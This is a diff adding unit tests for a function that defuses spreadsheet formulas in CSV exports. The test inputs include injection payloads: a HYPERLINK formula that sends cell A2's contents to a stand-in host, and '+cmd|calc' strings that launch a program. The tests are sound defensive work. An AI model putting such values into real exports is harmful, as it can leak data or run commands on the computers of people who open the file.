@@ -1,5 +1,5 @@
 import { describe, expect, it } from 'vitest'
-import { toCsv } from './csv'
+import { toCsv, neutralizeFormula } from './csv'
 
 const lines = (csv: string) => csv.split('\r\n')
 
@@ -57,5 +57,26 @@ describe('toCsv', () => {
 
   it('quotes a header that needs it too', () => {
     expect(lines(toCsv(['scans, total'], []))[0]).toBe('"scans, total"')
+  })
+})
+
+describe('spreadsheet formulas in exported text', () => {
+  it('turns a cell that would run as a formula into text', () => {
+    expect(neutralizeFormula('=HYPERLINK("http://x/?"&A2,"Open")')).toBe(
+      `'=HYPERLINK("http://x/?"&A2,"Open")`,
+    )
+    expect(neutralizeFormula('@SUM(A1:A9)')).toBe(`'@SUM(A1:A9)`)
+    expect(neutralizeFormula('+cmd|calc')).toBe(`'+cmd|calc`)
+    expect(neutralizeFormula('-2+3+cmd|calc')).toBe(`'-2+3+cmd|calc`)
+  })
+
+  it('leaves phone numbers, figures and ordinary text alone', () => {
+    expect(neutralizeFormula('+961 3 123 456')).toBe('+961 3 123 456')
+    expect(neutralizeFormula('-12.5')).toBe('-12.5')
+    expect(neutralizeFormula('Hotel Albergo')).toBe('Hotel Albergo')
+  })
+
+  it('applies to every text cell of an export, and never to numbers', () => {
+    expect(toCsv(['name', 'n'], [['=1+1', -3]])).toBe(`name,n\r\n'=1+1,-3`)
   })
 })
